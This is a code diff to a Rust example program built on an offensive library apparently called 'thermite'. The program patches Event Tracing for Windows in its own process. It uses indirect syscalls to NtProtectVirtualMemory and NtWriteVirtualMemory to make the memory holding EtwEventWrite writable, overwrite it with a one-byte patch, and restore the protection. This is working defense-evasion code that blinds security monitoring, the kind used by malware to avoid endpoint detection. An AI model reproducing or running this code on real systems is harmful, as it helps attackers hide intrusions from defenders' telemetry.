@@ -8,11 +8,12 @@
 // TODO Hardware breakpoints
 
 use std::{mem, process};
+
+use thermite::{check_status, error, info};
+use thermite::indirect_syscall as syscall;
 use thermite::models::windows::*;
 use thermite::models::windows::nt_status::NtStatus;
-use thermite::{error, info, syscall_status};
 use thermite::peb_walk::{get_function_address, get_module_address};
-use thermite::indirect_syscall as syscall;
 
 
 fn main() {
@@ -33,38 +34,30 @@ fn local_etw_patcher() {
 
 	// First we unprotect the memory region hosting the EtwEventWrite function
 	let mut bytes_written: usize = 1;
-	let nt_status = syscall!(
-        "NtProtectVirtualMemory",
-	        process_handle,          // [in]      HANDLE  ProcessHandle,
-	        &mut etw_handle,         // [in, out] PVOID   *BaseAddress,
-	        &mut bytes_written,      // [in, out] PULONG  NumberOfBytesToProtect,
-	        PAGE_EXECUTE_READWRITE,  // [in]      ULONG   NewAccessProtection,
-	        &mut old_protec,         // [out]     PULONG  OldAccessProtection,
-    );
-	syscall_status!("NtProtectVirtualMemory", nt_status);
+	syscall!("NtProtectVirtualMemory",
+        process_handle,          // [in]      HANDLE  ProcessHandle,
+        &mut etw_handle,         // [in, out] PVOID   *BaseAddress,
+        &mut bytes_written,      // [in, out] PULONG  NumberOfBytesToProtect,
+        PAGE_EXECUTE_READWRITE,  // [in]      ULONG   NewAccessProtection,
+        &mut old_protec);        // [out]     PULONG  OldAccessProtection,
 
 	// We write our patch
-	let nt_status = syscall!(
-        "NtWriteVirtualMemory",
-	        process_handle,      // [in]            HANDLE  ProcessHandle,
-	        &etw_handle,         // [in]            PVOID   *BaseAddress,
-	        &patch,              // [in]            PVOID   Buffer,
-	        1usize,              // [in]            ULONG   NumberOfBytesToWrite,
-	        &mut bytes_written,  // [out, optional] PULONG  NumberOfBytesWritten ,
-    );
+	syscall!("NtWriteVirtualMemory",
+        process_handle,      // [in]            HANDLE  ProcessHandle,
+        &etw_handle,         // [in]            PVOID   *BaseAddress,
+        &patch,              // [in]            PVOID   Buffer,
+        1usize,              // [in]            ULONG   NumberOfBytesToWrite,
+        &mut bytes_written); // [out, optional] PULONG  NumberOfBytesWritten ,
+
 	info!("Written {} bytes in remote memory", bytes_written);
-	syscall_status!("NtWriteVirtualMemory", nt_status);
 
 	// Then we put the memory protection back in its original state
-	let nt_status = syscall!(
-        "NtProtectVirtualMemory",
-	        process_handle,      // [in]      HANDLE  ProcessHandle,
-	        &mut etw_handle,     // [in, out] PVOID   *BaseAddress,
-	        &mut bytes_written,  // [in, out] PULONG  NumberOfBytesToProtect,
-	        old_protec,          // [in]      ULONG   NewAccessProtection,
-	        &mut new_protec,     // [out]     PULONG  OldAccessProtection,
-    );
-	syscall_status!("NtProtectVirtualMemory", nt_status);
+	syscall!("NtProtectVirtualMemory",
+        process_handle,      // [in]      HANDLE  ProcessHandle,
+        &mut etw_handle,     // [in, out] PVOID   *BaseAddress,
+        &mut bytes_written,  // [in, out] PULONG  NumberOfBytesToProtect,
+        old_protec,          // [in]      ULONG   NewAccessProtection,
+        &mut new_protec);    // [out]     PULONG  OldAccessProtection,
 
 	// ETW should be patched for our process
 }
